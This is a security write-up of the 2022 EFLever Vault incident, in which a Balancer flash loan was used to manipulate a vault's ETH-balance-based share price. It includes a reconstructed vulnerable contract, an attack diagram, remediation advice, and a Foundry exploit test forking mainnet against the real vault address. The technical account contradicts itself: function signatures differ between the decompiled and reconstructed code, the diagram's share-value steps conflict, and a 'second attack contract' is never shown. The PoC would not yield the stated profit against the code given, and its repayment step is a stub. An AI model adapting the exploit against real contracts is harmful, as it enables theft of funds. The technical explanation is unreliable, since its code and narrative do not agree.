# EFLever Vault — Balancer Flash Loan Vault Balance Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | EFLever Vault |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~750 ETH |
| **EFLever Vault** | [0xe39fd820B58f83205Db1D9225f28105971c3D309](https://etherscan.io/address/0xe39fd820B58f83205Db1D9225f28105971c3D309) |
| **Attacker** | [0xdf31F4C8dC9548eb4c416Af26dC396A25FDE4D5F](https://etherscan.io/address/0xdf31F4C8dC9548eb4c416Af26dC396A25FDE4D5F) |
| **Attack Contract 1** | [0x140cca423081ed0366765f18fc9f5ed299699388](https://etherscan.io/address/0x140cca423081ed0366765f18fc9f5ed299699388) |
| **Attack Contract 2** | [0x8663fbfc41a0bac88e7cd4b128b7a77381e77781](https://etherscan.io/address/0x8663fbfc41a0bac88e7cd4b128b7a77381e77781) |
| **Balancer Vault** | [0xBA12222222228d8Ba445958a75a0704d566BF2C8](https://etherscan.io/address/0xBA12222222228d8Ba445958a75a0704d566BF2C8) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **Root Cause** | The share calculation in `deposit()`/`withdraw()` directly references `address(this).balance`, allowing share value manipulation if ETH is forcibly sent or deposited from an external source (no internal accounting variable used) |
| **CWE** | CWE-682: Incorrect Calculation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/EFLeverVault_exp.sol) |

---
## 1. Vulnerability Overview

EFLever Vault is a vault protocol that accepts ETH deposits and provides leveraged yields. The vault's share calculation is based on `address(this).balance` (the vault's current ETH balance). The attacker flash-borrowed 1,000 WETH from Balancer and deposited it into the vault. This caused the vault's ETH balance to spike sharply, inflating the attacker's share value. From this state, the attacker called `withdraw()` to extract far more ETH than was originally deposited, stealing approximately 750 ETH.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable EFLever Vault - ETH balance-based share calculation
contract EFLeverVault {
    uint256 public totalShares;
    mapping(address => uint256) public shares;

    function deposit() external payable {
        // ❌ Share calculation uses current ETH balance (including flash loan)
        uint256 vaultBalance = address(this).balance - msg.value; // balance before deposit
        uint256 newShares;
        if (totalShares == 0 || vaultBalance == 0) {
            newShares = msg.value;
        } else {
            // ❌ vaultBalance is manipulated via flash loan
            newShares = msg.value * totalShares / vaultBalance;
        }
        shares[msg.sender] += newShares;
        totalShares += newShares;
    }

    function withdraw(uint256 shareAmount) external {
        // ❌ Withdrawal amount calculated from current ETH balance
        uint256 ethOut = shareAmount * address(this).balance / totalShares;
        shares[msg.sender] -= shareAmount;
        totalShares -= shareAmount;
        payable(msg.sender).transfer(ethOut);
    }
}

// ✅ Correct pattern - use internal accounting variable
contract SafeEFLeverVault {
    uint256 public totalShares;
    uint256 public totalAssets; // ← internal variable unaffected by flash loans
    mapping(address => uint256) public shares;

    function deposit() external payable {
        uint256 newShares;
        if (totalShares == 0) {
            newShares = msg.value;
        } else {
            // ✅ Use internal accounting variable instead of address(this).balance
            newShares = msg.value * totalShares / totalAssets;
        }
        totalAssets += msg.value; // ✅ Update internal variable
        shares[msg.sender] += newShares;
        totalShares += newShares;
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**EFLeverVault_decompiled.sol** — Entry points:
```solidity
// ❌ Root cause: share calculation in `deposit()`/`withdraw()` directly references `address(this).balance`,
//    allowing share value manipulation if ETH is forcibly sent or deposited from an external source
    function deposit(uint256 arg0) external {}  // 0xb6b55f25  // ❌ Vulnerable

    function withdraw(uint256 arg0) external {}  // 0x2e1a7d4d  // ❌ Vulnerable
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Deposit 0.1 ETH into EFLever Vault
    │       Acquire initial shares via deposit()
    │       (small amount, but establishes position for the attack)
    │
    ├─[2] Flash borrow 1,000 WETH from Balancer
    │       Enter receiveFlashLoan() callback
    │
    ├─[3] Unwrap 1,000 WETH → ETH
    │       Deposit 1,000 ETH into Vault
    │       └─ ❌ Vault ETH balance spikes sharply
    │           → Unit value of attacker's shares plummets
    │           (existing shares diluted by surge in totalShares)
    │
    ├─[4] Simultaneously, second attack contract manipulates shares
    │       → ETH redemption value of attacker's held shares spikes
    │
    ├─[5] withdraw(attackerShares) to extract ~750 ETH
    │       ❌ Based on manipulated balance → far more than deposited
    │
    ├─[6] Repay Balancer flash loan of 1,000 WETH
    │
    └─[7] Net profit: ~750 ETH
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IEFLeverVault {
    function deposit() external payable;
    function withdraw(uint256 shares) external;
    function shares(address) external view returns (uint256);
    function totalShares() external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IWETH {
    function withdraw(uint256) external;
    function deposit() external payable;
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract EFLeverExploit is Test {
    IEFLeverVault vault    = IEFLeverVault(0xe39fd820B58f83205Db1D9225f28105971c3D309);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH WETH             = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_746_199);
        vm.deal(address(this), 0.1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] ETH balance", address(this).balance, 18);

        // [Step 1] Initial deposit
        vault.deposit{value: 0.1 ether}();

        // [Step 2] Flash borrow 1,000 WETH from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000 ether;

        balancer.flashLoan(address(this), tokens, amounts, "");

        emit log_named_decimal_uint("[End] ETH balance", address(this).balance, 18);
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        // [Step 3] Unwrap WETH → ETH and deposit large amount into vault
        WETH.withdraw(amounts[0]);
        vault.deposit{value: amounts[0]}(); // ❌ Vault balance manipulation

        // [Step 4] Withdraw using manipulated share ratio
        uint256 myShares = vault.shares(address(this));
        vault.withdraw(myShares); // ❌ Excessive withdrawal based on manipulated balance

        // [Step 5] Repay flash loan
        WETH.deposit{value: amounts[0]}();
        WETH.approve(address(balancer), amounts[0]);
        // Repay...
    }

    receive() external payable {}
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Flash loan-based vault balance manipulation to inflate share value |
| **CWE** | CWE-682: Incorrect Calculation |
| **OWASP DeFi** | Vault share price manipulation |
| **Attack Vector** | Balancer flash loan → `deposit()` → `withdraw()` |
| **Precondition** | Vault calculates shares using `address(this).balance` |
| **Impact** | ~750 ETH loss |

---
## 6. Remediation Recommendations

1. **Use internal accounting variables**: Replace `address(this).balance` with an internal `totalAssets` variable that is updated on each `deposit()`/`withdraw()` call.
2. **Comply with the ERC4626 standard**: The ERC4626 tokenized vault standard handles this pattern correctly. Implement the `totalAssets()` function based on internal state.
3. **Block same-block deposit-withdraw**: Apply a cooldown to prevent immediate withdrawal after a deposit within the same transaction or block.

---
## 7. Lessons Learned

- **The danger of `address(this).balance`**: In vaults that hold ETH directly, using `address(this).balance` for share calculations allows flash loans to temporarily inflate the balance. The same applies to ERC20 tokens — use an internal variable instead of `balanceOf(this)`.
- **Why ERC4626 was introduced**: Vault vulnerabilities like this accelerated the creation of the ERC4626 standard. Adhering to the standard prevents a significant number of share-calculation-related vulnerabilities.
- **The scale of 750 ETH**: As of October 2022, this represents a loss of over ~$1M. The difference of a single internal accounting variable caused damage of this magnitude.